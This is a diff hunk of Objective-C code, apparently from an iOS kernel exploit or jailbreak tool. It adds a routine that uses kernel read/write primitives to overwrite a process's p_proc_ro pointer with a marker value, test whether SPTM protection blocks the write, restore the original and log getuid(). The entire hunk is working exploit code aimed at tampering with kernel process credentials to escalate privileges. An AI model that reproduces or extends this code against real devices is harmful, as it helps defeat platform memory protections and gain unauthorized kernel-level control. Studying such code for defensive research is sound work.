@@ -755,6 +755,27 @@
                     [r appendString:@"  >>> PROC WRITE VERIFIED! type 0x21 writable!\n"];
                     kwrite_zone_element_qword(proc, listNext, proc, 0x400);
                     [r appendString:@"  restored p_list.next\n"];
+
+                    // ---- p_proc_ro swap attempt ----
+                    extern uint32_t off_proc_p_proc_ro;
+                    uint64_t procRoSlot = proc + off_proc_p_proc_ro;
+                    uint64_t origProcRo = early_kread64(procRoSlot);
+                    [r appendFormat:@"  p_proc_ro = 0x%016llx (slot=0x%016llx)\n", origProcRo, procRoSlot];
+                    // Test: write a marker to p_proc_ro slot and see if it persists
+                    uint64_t testProcRo = 0xCCCCDDDDEEEEFFFFULL;
+                    krw_zone_verdict sv = kwrite_zone_element_qword(procRoSlot, testProcRo, proc, 0x400);
+                    uint64_t swapRB = early_kread64(procRoSlot);
+                    [r appendFormat:@"  p_proc_ro write: verdict=%d  readback=0x%016llx (expect 0x%016llx)\n",
+                        (int)sv, swapRB, testProcRo];
+                    if (swapRB == testProcRo) {
+                        [r appendString:@"  >>> P_PROC_RO SLOT WRITABLE! SPTM did not block!\n"];
+                        [r appendString:@"  >>> restoring original p_proc_ro\n"];
+                        kwrite_zone_element_qword(procRoSlot, origProcRo, proc, 0x400);
+                        [r appendFormat:@"  getuid() after restore: %d\n", getuid()];
+                    } else {
+                        [r appendString:@"  >>> p_proc_ro write did not persist (SPTM or RO)\n"];
+                        kwrite_zone_element_qword(procRoSlot, origProcRo, proc, 0x400);
+                    }
                 } else {
                     [r appendString:@"  >>> proc write did not persist\n"];
                     kwrite_zone_element_qword(proc, listNext, proc, 0x400);
